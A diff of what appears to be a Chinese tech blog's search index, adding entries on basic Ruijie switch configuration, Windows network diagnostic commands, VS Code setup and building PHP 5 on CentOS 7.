+<h2 id="设备基本操作"><a href="#设备基本操作" class="headerlink" title="设备基本操作"></a>设备基本操作</h2><h3 id="设备命名"><a href="#设备命名" class="headerlink" title="设备命名"></a>设备命名</h3><ul>
+<li>设备命名用于标识设备信息 </li>
+<li>配置规范 <ul>
+<li>一般参照客户规范 </li>
+<li>如果自定义：参考设备的地理位置、网络位置、设备型号、设备编号等因素，制定统一的命名规范 （ AABB-CC-DD ）<ul>
+<li>AA：表示该设备的地理位置</li>
+<li>BB：表示设备的网络位置</li>
+<li>CC：表示设备的型号</li>
+<li>DD： 表示设备的编号</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">配置命令
+Ruijie(config)# hostname wlzx-core-8610-1</code></pre>
+
+
+
+<h3 id="配置网络设备的管理IP"><a href="#配置网络设备的管理IP" class="headerlink" title="配置网络设备的管理IP"></a>配置网络设备的管理IP</h3><p>配置管理IP后，能方便对设备进行远程管理 </p>
+<p>二层交换机通过配置管理VLAN实现，并且交换机可以理解为一台终端，需要配置网关 </p>
+<p>多层设备的任意一个三层接口IP可以作为管理IP</p>
+<pre class="language-none"><code class="language-none">管理IP配置命令
+Ruijie(config)#vlan 10
+Ruijie(config)#int vlan 10
+Ruijie(config-if-VLAN 10)#ip add 10.1.1.254 255.255.255.0 &#x2F;&#x2F;管理IP地址
+Ruijie(config-if-VLAN 10)#no shutdown
+Ruijie(config)#ip default-gateway 10.1.1.200 &#x2F;&#x2F;当前设备的网关，将被管理设备理解为一台PC终端</code></pre>
+
+
+
+<h3 id="配置网络设备的登陆密码"><a href="#配置网络设备的登陆密码" class="headerlink" title="配置网络设备的登陆密码"></a>配置网络设备的登陆密码</h3><ul>
+<li><p>通过配置密码可以设备管理的安全性</p>
+</li>
+<li><p>配置特权模式密码</p>
+<pre class="language-none"><code class="language-none">Ruijie(config)#enable secret level 15 0 ruijie</code></pre>
+</li>
+<li><p>配置Telnet密码</p>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">Ruijie(config)#line vty 0 4
+Ruijie(config-line)#password ruijie</code></pre>
+
+<ul>
+<li>配置全局用户密码</li>
+</ul>
+<pre class="language-none"><code class="language-none">Ruijie(config)#username admin password ruijie</code></pre>
+
+<ul>
+<li>密文显示密码</li>
+</ul>
+<pre class="language-none"><code class="language-none">Ruijie(config)#service password-encryption</code></pre>
+
+<h3 id="常用show命令"><a href="#常用show命令" class="headerlink" title="常用show命令"></a>常用show命令</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Show running-config</td>
+<td>查看设备当前配置</td>
+</tr>
+<tr>
+<td>Show version</td>
+<td>查看设备版本信息</td>
+</tr>
+<tr>
+<td>Show cpu</td>
+<td>查看设备CPU利用率</td>
+</tr>
+<tr>
+<td>Show interface counters</td>
+<td>查看设备接口统计</td>
+</tr>
+<tr>
+<td>Show log</td>
+<td>查看设备日志</td>
+</tr>
+<tr>
+<td>Show arp</td>
+<td>查看设备ARP表</td>
+</tr>
+<tr>
+<td>Show mac-address-table</td>
+<td>查看设备mac表</td>
+</tr>
+<tr>
+<td>Show clock</td>
+<td>查看当前时间</td>
+</tr>
+</tbody></table>
+<h3 id="查看当前时间"><a href="#查看当前时间" class="headerlink" title="查看当前时间"></a>查看当前时间</h3><ul>
+<li>Show命令是操作RGOS时，最常用的命令之一 </li>
+<li>任意命令行模式均可以使用show命令查看当前设备的配置或状态</li>
+<li>注意：show run命令查看的是当前设备的配置，不是保存的配置 <ul>
+<li>配置查看：show run-config</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608171540.png" alt="16" loading="lazy"></p>
+<h3 id="设备状态查看"><a href="#设备状态查看" class="headerlink" title="设备状态查看"></a>设备状态查看</h3><ul>
+<li>管道符应用概述<ul>
+<li>在Show命令后面可以加上管道符“|”指定信息的输出</li>
+</ul>
+</li>
+<li>管道符类型 <ul>
+<li>| begin xyz ：输出信息从xyz开始</li>
+<li>| exclude xyz：输出信息排除xyz </li>
+<li>| include xyz：输出信息包含xyz</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608171545.png" alt="17" loading="lazy"></p>
+<h3 id="接口描述"><a href="#接口描述" class="headerlink" title="接口描述"></a>接口描述</h3><ul>
+<li>接口描述用于标识设备接口信息，方便在查看接口状态时识别接口的用途</li>
+<li>配置规范<ul>
+<li>根据客户的规范 </li>
+<li>自定义：to-对端设备名-对端接口名</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">配置命令
+WLZX-core-8610-2(config)#int giga 6&#x2F;1
+WLZX-core-8610-2(config)#description to-wlzx-core-8610-1-giga6&#x2F;1</code></pre>
+
+<h3 id="Banner配置"><a href="#Banner配置" class="headerlink" title="Banner配置"></a>Banner配置</h3><ul>
+<li>登陆设备时，输出提示或警告信息 </li>
+<li>配置规范 <ul>
+<li>客户规范 </li>
+<li>自定义</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">配置命令
+Ruijie(config)#banner login ^
+Enter TEXT message. End with the character 
+&#39;^&#39;.
+Warning: Unauthorized access are forbidden!!
+Your behavior will be recorded!!
+</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608171550.png" alt="18" loading="lazy"></p>
+<h3 id="时间配置"><a href="#时间配置" class="headerlink" title="时间配置"></a>时间配置</h3><ul>
+<li>NTP协议的作用是让网络设备显示准确的时间，便于监控和维护</li>
+<li>手工设置通过clock set设置时间</li>
+</ul>
+<pre class="language-none"><code class="language-none">Ruijie#clock set hh:mm:ss day month year</code></pre>
+
+<ul>
+<li>自动设置&#x2F;同步时间(依赖于NTP&#x2F;SNTP服务器)</li>
+</ul>
+<pre class="language-none"><code class="language-none">Ruijie（config）# &#123;sntp|ntp&#125; enable
+Ruijie（config）# &#123;sntp|ntp&#125; server ip_addr</code></pre>
+
+
+
+<h3 id="SNMP配置"><a href="#SNMP配置" class="headerlink" title="SNMP配置"></a>SNMP配置</h3><ul>
+<li>Simple Notwork Management，网管软件通过该协议获取设备运行信息、配置设备、故障定位 <ul>
+<li>SNMP有版本v1&#x2F;v2c&#x2F;v3，默认使用v2c  v1&#x2F;v2c 使用团体名进行认证 </li>
+<li>V3版本的安全性更高</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">SNMP配置：
+Ruijie(config)#snmp-server community ruijie &#123;ro|rw&#125;
+&#x2F;&#x2F;ro表示只读属性，网管软件通过该团体名只能获取相关信息
+&#x2F;&#x2F;rw表示可读写属性，网管软件通过该团体名可以执行设备配置操作</code></pre>
+
+<h3 id="日志应用"><a href="#日志应用" class="headerlink" title="日志应用"></a>日志应用</h3><ul>
+<li>日志记录了设备运行过程中的一些关键信息，在出现故障时显得尤为重要</li>
+<li>日志功能默认开启，并将信息记录在内存中，重启后日志将丢失 </li>
+<li>项目中，建议搭建syslog服务器，记录关键设备（汇聚&#x2F;核心）日志信息</li>
+</ul>
+<pre class="language-none"><code class="language-none">日志服务配置：
+Ruijie(config)#service sequence-numbers 
+Ruijie(config)#service sysname
+Ruijie(config)#logging userinfo command-log
+Ruijie(config)#logging server ip_addr
+Ruijie(config)#logging source interface loopback 0
+Ruijie#terminal monitor </code></pre>
+
+<h3 id="网络通讯测试"><a href="#网络通讯测试" class="headerlink" title="网络通讯测试"></a>网络通讯测试</h3><ul>
+<li>Ping用于测试网络的连通性，可使用组合命令进行丰富的网络测试</li>
+</ul>
+<pre class="language-none"><code class="language-none">Ruijie#ping 192.168.100.10 source 10.1.1.1 ntime 100 length 1500 timeout 3
+&#x2F;&#x2F;测试从源10.1.1.1到达192.168.100.10的连通性，连续ping100次，每个包长度1500字节，超时时间3秒</code></pre>
+
+<ul>
+<li>Tracertoute用于显示数据包从源地址到目的地址， 所经过的所有网络设备 <ul>
+<li>用于检查网络的连通性，在网络故障发生时，准确地定位故障发生的位置。</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">Ruijie#traceroute 192.168.100.10 source 10.1.1.1 probe 10 ttl 1 3 timeout 3
+&#x2F;&#x2F;测试从源10.1.1.1到192.168.100.10的连通性，并显示路径上的网络设备，探测数据包每跳最多跟踪10条路
+由（例如负载均衡时，会朝多个方向进行探测），TTL值范围是1-3（最多3跳），超时时间3秒</code></pre>
+
+<h2 id="系统文件管理"><a href="#系统文件管理" class="headerlink" title="系统文件管理"></a>系统文件管理</h2><h3 id="RGOS的文件系统"><a href="#RGOS的文件系统" class="headerlink" title="RGOS的文件系统"></a>RGOS的文件系统</h3><ul>
+<li>如下图，flash中保存的数据时掉电不丢失的数据：<ul>
+<li>配置文件：config.text </li>
+<li>RGOS系统文件：rgos.bin </li>
+<li>日志文件：syslog.text</li>
+<li>其他运行文件</li>
+</ul>
+</li>
+<li>当设备开机运行时，会将RGOS以及配置文件全部都加载到内存中运行</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608171557.png" alt="19" loading="lazy"></p>
+<h3 id="设备配置管理"><a href="#设备配置管理" class="headerlink" title="设备配置管理"></a>设备配置管理</h3><ul>
+<li>设备启动时，从Flash介质中读取config.text文件，并作为当前设备的配置</li>
+<li>Running config是当前正在运行的配置，保存后，将写入config.text</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Ruijie#write</td>
+<td>保存配置</td>
+</tr>
+<tr>
+<td>Ruijie(config)#no command</td>
+<td>删除某条具体命令</td>
+</tr>
+<tr>
+<td>Ruijie#delete config.text</td>
+<td>恢复出产配置（锐捷设备不需要单独删除VLAN）</td>
+</tr>
+<tr>
+<td>Ruijie#copy flash:config.text flash:config.bak</td>
+<td>将当前保存的配置进行备份</td>
+</tr>
+<tr>
+<td>Ruijie#copy flash:config.bak flash:config.text</td>
+<td>将备份配置恢复至当前保存的配置</td>
+</tr>
+<tr>
+<td>Ruijie#reload</td>
+<td>重启设备（是否要保存，需要注意）</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>锐捷</category>
+      </categories>
+      <tags>
+        <tag>锐捷</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Suite汉化教程</title>
     <url>/posts/d334592a/</url>
     <content><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>下载所需安装包</p>
@@ -1926,6 +2356,31 @@ gpg:               已导入：1</code></pre>
       </categories>
       <tags>
         <tag>汉化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VScode简单配置</title>
+    <url>/posts/83ecd2a4/</url>
+    <content><![CDATA[<h2 id="汉化"><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h2><p>点击左侧工具栏的extensions或者使用快捷键【Ctrl+Shift+X】，输入chinese，点击Install安装中文简体</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194438.png" alt="1" loading="lazy"></p>
+<p>使用快捷键【Ctrl+Shift+P】弹出查找命令框，输入language, 找到Configure Display Language，点击，选择locale属性为”zh-CN”</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194441.png" alt="2" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194443.png" alt="3" loading="lazy"></p>
+<h2 id="VSCode配置Python开发环境"><a href="#VSCode配置Python开发环境" class="headerlink" title="VSCode配置Python开发环境"></a>VSCode配置Python开发环境</h2><p>安装python环境</p>
+<p>（略）</p>
+<p>打开VSCode, 搜索插件Python并安装。</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194445.png" alt="4" loading="lazy"></p>
+<p>Ctrl+Shift+P  &gt; Command Palette，打开命令面板输入<code>Python: Select Interpreter</code></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194447.png" alt="5" loading="lazy"></p>
+<p>新建一个Python文件输入<code>print(&quot;helloword&quot;)</code>后运行</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194449.png" alt="7" loading="lazy"></p>
+]]></content>
+      <categories>
+        <category>教程</category>
+        <category>其他</category>
+      </categories>
+      <tags>
+        <tag>其他</tag>
       </tags>
   </entry>
   <entry>
@@ -2242,133 +2697,208 @@ cond(no)-&gt;op</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>VScode简单配置</title>
-    <url>/posts/83ecd2a4/</url>
-    <content><![CDATA[<h2 id="汉化"><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h2><p>点击左侧工具栏的extensions或者使用快捷键【Ctrl+Shift+X】，输入chinese，点击Install安装中文简体</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194438.png" alt="1" loading="lazy"></p>
-<p>使用快捷键【Ctrl+Shift+P】弹出查找命令框，输入language, 找到Configure Display Language，点击，选择locale属性为”zh-CN”</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194441.png" alt="2" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194443.png" alt="3" loading="lazy"></p>
-<h2 id="VSCode配置Python开发环境"><a href="#VSCode配置Python开发环境" class="headerlink" title="VSCode配置Python开发环境"></a>VSCode配置Python开发环境</h2><p>安装python环境</p>
-<p>（略）</p>
-<p>打开VSCode, 搜索插件Python并安装。</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194445.png" alt="4" loading="lazy"></p>
-<p>Ctrl+Shift+P  &gt; Command Palette，打开命令面板输入<code>Python: Select Interpreter</code></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194447.png" alt="5" loading="lazy"></p>
-<p>新建一个Python文件输入<code>print(&quot;helloword&quot;)</code>后运行</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194449.png" alt="7" loading="lazy"></p>
+    <title>Windows常用网络命令</title>
+    <url>/posts/13c75e65/</url>
+    <content><![CDATA[<div class="danger">
+
+
+<blockquote>
+<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
+</blockquote>
+</div>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h2 id="Ping命令应用解析"><a href="#Ping命令应用解析" class="headerlink" title="Ping命令应用解析"></a>Ping命令应用解析</h2><h3 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h3><ul>
+<li>ICMP协议全称Internet控制报文协议（Internet Control Message Protocol），是网络层的一个重要协 议</li>
+<li>ICMP协议用来在网络设备间传递各种差错和控制信息</li>
+<li>对于收集各种网络信息、诊断和排除各种网络故障具有至关重要的作用</li>
+<li>ICMP协议有两个重要应用，在Windows系统与RGOS中经常会使用到</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155123.png" alt="1" loading="lazy"></p>
+<h3 id="ICMP信息反馈"><a href="#ICMP信息反馈" class="headerlink" title="ICMP信息反馈"></a>ICMP信息反馈</h3><ul>
+<li>根据ICMP的反馈信息，可以分析出到达目的地址连通性的信息 </li>
+<li>根据这些信息反馈，可以初步分析网络故障的原因</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>反馈信息</th>
+<th>信息解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>！</td>
+<td>收到1个ICMP的request replay</td>
+</tr>
+<tr>
+<td>U</td>
+<td>收到1个ICMP不可达信息</td>
+</tr>
+<tr>
+<td>.</td>
+<td>表示在规定的时间内没有收到对应的request replay</td>
+</tr>
+<tr>
+<td>Request Timed Out</td>
+<td>超时，目标主机不存在 或ICMP应答功能关闭，不予应答</td>
+</tr>
+<tr>
+<td>Destination Host Unreachable</td>
+<td>网络设备没有到目标主机的路由</td>
+</tr>
+<tr>
+<td>Unknown host</td>
+<td>未知主机 ，有可能是DNS的问题</td>
+</tr>
+</tbody></table>
+<h3 id="Ping命令应用解析-1"><a href="#Ping命令应用解析-1" class="headerlink" title="Ping命令应用解析"></a>Ping命令应用解析</h3><ul>
+<li>Ping命令应用解析<ul>
+<li>作用：基于ICMP协议，测试网络联通性</li>
+<li>默认情况下，ping操作会收到4个ICMP回包，包大小为32字节，TTL等于64。</li>
+<li>操作演示</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155128.png" alt="2" loading="lazy"></p>
+<ul>
+<li>Ping命令扩展（-t）<ul>
+<li>作用：长ping数据包不中断 </li>
+<li>说明：键入Ctrl+C可中断ICMP回包 </li>
+<li>操作演示：</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155135.png" alt="3" loading="lazy"></p>
+<ul>
+<li>Ping命令扩展（-n）<ul>
+<li>作用：指定单次ping包的发送数量 </li>
+<li>操作演示：</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155145.png" alt="4" loading="lazy"></p>
+<ul>
+<li>Ping命令扩展（-l）<ul>
+<li>作用：修改Ping包大小，默认为32字节。可用于测试接口MTU值设置是否合理等场景</li>
+<li>操作演示：</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155149.png" alt="5" loading="lazy"></p>
+<ul>
+<li>Ping命令扩展（参数组合）<ul>
+<li>作用： ping命令后加相应参数，可自定义连通性测试的效果</li>
+</ul>
+</li>
+</ul>
+<p>略</p>
+<ul>
+<li>Ping命令扩展（ping域名）<ul>
+<li>作用：测试与特定网络资源的连通性时，若不知其具体IP地址，可直接ping其域名，此时DNS可自动解析为 对应IP地址</li>
+<li>操作演示：</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155154.png" alt="6" loading="lazy"></p>
+<h2 id="Tracert命令应用解析"><a href="#Tracert命令应用解析" class="headerlink" title="Tracert命令应用解析"></a>Tracert命令应用解析</h2><h3 id="Tracert命令应用解析-1"><a href="#Tracert命令应用解析-1" class="headerlink" title="Tracert命令应用解析"></a>Tracert命令应用解析</h3><ul>
+<li><p>Tracert命令</p>
+<ul>
+<li>作用：基于ICMP协议，在探测网络连通性的同时，探测到目标主机所经过的路径，显示沿路径设备的接口IP </li>
+<li>原理：<ul>
+<li>源主机首先发三个包，TTL&#x3D;1 </li>
+<li>第一台路由器收到后，TTL-1&#x3D;0，丢弃并回复源主机ICMP报超时消息 </li>
+<li>收到超时消息，源主机显示信息并发送下一组三个包，TTL&#x3D;上一组TTL+1 </li>
+<li>收到目标主机的应答后程序终止</li>
+<li>*号表示探测包丢失</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155203.png" alt="7" loading="lazy"></p>
+<ul>
+<li><p>Tracert命令</p>
+<ul>
+<li>说明：运营商核心骨干网及大型IDC数据中心为了安全起见一般会通过相关技术做到核心路径隐藏，此时 tracert并非实际路径跟踪</li>
+<li>操作演示</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155211.png" alt="9" loading="lazy"></p>
+<ul>
+<li>Tracert命令（域名跟踪） </li>
+<li>作用：不得知目标具体IP地址的情况下，可tracert其域名，此时DNS将会解析出其IP地址。 </li>
+<li>操作演示</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155207.png" alt="8" loading="lazy"></p>
+<h2 id="Ipconfig命令应用解析"><a href="#Ipconfig命令应用解析" class="headerlink" title="Ipconfig命令应用解析"></a>Ipconfig命令应用解析</h2><h3 id="IPconfig命令应用解析"><a href="#IPconfig命令应用解析" class="headerlink" title="IPconfig命令应用解析"></a>IPconfig命令应用解析</h3><ul>
+<li>ipconfig命令<ul>
+<li>作用：显示所有适配器（网卡）的基本IP配置 </li>
+<li>操作演示：</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155220.png" alt="10" loading="lazy"></p>
+<ul>
+<li>Ipconfig &#x2F;all命令 <ul>
+<li>作用：显示所有适配器（网卡）详细完整的IP配置</li>
+<li>操作演示：</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155224.png" alt="11" loading="lazy"></p>
+<h2 id="其他Windows命令解析"><a href="#其他Windows命令解析" class="headerlink" title="其他Windows命令解析"></a>其他Windows命令解析</h2><h3 id="清除DNS缓存命令解析"><a href="#清除DNS缓存命令解析" class="headerlink" title="清除DNS缓存命令解析"></a>清除DNS缓存命令解析</h3><ul>
+<li>pconfig &#x2F;flushdns命令<ul>
+<li>作用：查看Windows系统arp表项。</li>
+<li>说明：可使用ipconfig &#x2F;flushdns清除DNS缓存表</li>
+<li>操作演示：</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155229.png" alt="12" loading="lazy"></p>
+<h3 id="arp-a命令应用解析"><a href="#arp-a命令应用解析" class="headerlink" title="arp -a命令应用解析"></a>arp -a命令应用解析</h3><ul>
+<li>arp –a 命令 <ul>
+<li>作用：查看Windows系统arp表项。</li>
+<li>说明：可使用arp –d命令清除arp缓存表 </li>
+<li>操作演示：</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155234.png" alt="13" loading="lazy"></p>
+<h3 id="Route-print命令应用解析"><a href="#Route-print命令应用解析" class="headerlink" title="Route print命令应用解析"></a>Route print命令应用解析</h3><ul>
+<li>Route print 命令<ul>
+<li>作用：查看Windows系统路由表</li>
+<li>操作演示：</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155238.png" alt="14" loading="lazy"></p>
+<h3 id="添加静态路由"><a href="#添加静态路由" class="headerlink" title="添加静态路由"></a>添加静态路由</h3><ul>
+<li><p>route –p add 【目标IP地址&#x2F;网段】 mask 【子网掩码】【下一跳】</p>
+<ul>
+<li>作用：Windows添加静态路由 </li>
+<li>操作演示</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155243.png" alt="15" loading="lazy"></p>
+<ul>
+<li>route print查看</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155246.png" alt="16" loading="lazy"></p>
+<ul>
+<li>Route delete删除</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155252.png" alt="17" loading="lazy"></p>
+<ul>
+<li>说明：增添&#x2F;删除静态路由操作需要在Windows超级管理员权限下进行</li>
+</ul>
+</li>
+</ul>
 ]]></content>
       <categories>
-        <category>教程</category>
-        <category>其他</category>
+        <category>学习</category>
+        <category>锐捷</category>
       </categories>
       <tags>
-        <tag>其他</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>centos7安装PHP5</title>
-    <url>/posts/b394315b/</url>
-    <content><![CDATA[<p>参考：<a href="https://www.cnblogs.com/xxdebug/p/14142266.html">centos7安装PHP5 - xiaoxiaoの - 博客园 </a></p>
-<ol>
-<li>创建文件夹</li>
-</ol>
-<pre class="language-none"><code class="language-none">mkdir &#x2F;usr&#x2F;local&#x2F;src&#x2F;php 
-
-cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;php</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130813652.png" alt="1" loading="lazy"></p>
-<ol start="2">
-<li>安装依赖</li>
-</ol>
-<pre class="language-none"><code class="language-none">yum install -y gcc gcc-c++ autoconf libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libpng libpng-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel bzip2 bzip2-devel ncurses curl openssl-devel gdbm-devel db4-devel libXpm-devel libX11-devel gd-devel gmp-devel readline-devel libxslt-devel expat-devel xmlrpc-c xmlrpc-c-devel</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130813996.png" alt="2" loading="lazy"></p>
-<ol start="3">
-<li>解压下载的php源码包</li>
-</ol>
-<pre class="language-none"><code class="language-none">tar -xzvf +你的包名.tar.gz</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814770.png" alt="3" loading="lazy"></p>
-<ol start="4">
-<li><p>将解压的文件复制到&#x2F;usr&#x2F;local&#x2F;src&#x2F;php&#x2F;下</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814486.png" alt="4" loading="lazy"></p>
-</li>
-<li><p>进入&#x2F;usr&#x2F;local&#x2F;src&#x2F;php&#x2F;php-5.5.25这个文件夹后在终端输入如下命令</p>
-</li>
-</ol>
-<pre class="language-none"><code class="language-none">cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;php&#x2F;php-5.5.25</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814634.png" alt="5" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;php --with-config-file-path&#x3D;&#x2F;usr&#x2F;local&#x2F;php&#x2F;etc --enable-fpm --enable-sysvsem --enable-sockets --enable-pcntl --enable-mbstring --enable-mysqlnd --enable-opcache --enable-shmop --enable-zip --enable-ftp --enable-gd-native-ttf --enable-wddx --enable-soap</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814784.png" alt="6" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">make</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814067.png" alt="7" loading="lazy"></p>
-<ol start="6">
-<li>安装</li>
-</ol>
-<pre class="language-none"><code class="language-none">make install
-
-cp &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php-fpm.conf.default php-fpm.conf
-
-cp &#x2F;usr&#x2F;local&#x2F;src&#x2F;php&#x2F;php-5.3.28&#x2F;php.ini-development &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php.ini-development
-
-cp &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php.ini-development &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php.ini
-
-cp &#x2F;usr&#x2F;local&#x2F;src&#x2F;php&#x2F;php-5.3.28&#x2F;sapi&#x2F;fpm&#x2F;init.d.php-fpm &#x2F;etc&#x2F;init.d&#x2F;php-fpm</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814525.png" alt="8" loading="lazy"></p>
-<ol start="7">
-<li>添加权限</li>
-</ol>
-<pre class="language-none"><code class="language-none">chmod +x &#x2F;etc&#x2F;init.d&#x2F;php-fpm</code></pre>
-
-<ol start="8">
-<li>添加开机启动</li>
-</ol>
-<pre class="language-none"><code class="language-none">chkconfig --add php-fpm</code></pre>
-
-<ol start="9">
-<li>设置启动等级</li>
-</ol>
-<pre class="language-none"><code class="language-none">chkconfig --level 35 php-fpm on
-
-cp &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php-fpm.conf.default &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php-fpm.conf
-
-vim &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php-fpm.conf 
-
-找到 ;pid &#x3D; run&#x2F;php-fpm.pid 去掉前面的分号</code></pre>
-
-<ol start="10">
-<li>启动</li>
-</ol>
-<pre class="language-none"><code class="language-none">service php-fpm start</code></pre>
-
-<ol start="11">
-<li>设置环境变量</li>
-</ol>
-<pre class="language-none"><code class="language-none">vim &#x2F;etc&#x2F;profile 
-
-底部添加
-PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;php&#x2F;bin环境变量生效 source &#x2F;etc&#x2F;profile</code></pre>
-
-<ol start="12">
-<li>查看安装版本</li>
-</ol>
-<pre class="language-none"><code class="language-none">php -v</code></pre>
-]]></content>
-      <categories>
-        <category>教程</category>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>CentOS7</tag>
+        <tag>锐捷</tag>
       </tags>
   </entry>
   <entry>
@@ -2476,6 +3006,111 @@ PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;php&#x2F;bin环境变量生效 source 
       </categories>
       <tags>
         <tag>DVWA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>centos7安装PHP5</title>
+    <url>/posts/b394315b/</url>
+    <content><![CDATA[<p>参考：<a href="https://www.cnblogs.com/xxdebug/p/14142266.html">centos7安装PHP5 - xiaoxiaoの - 博客园 </a></p>
+<ol>
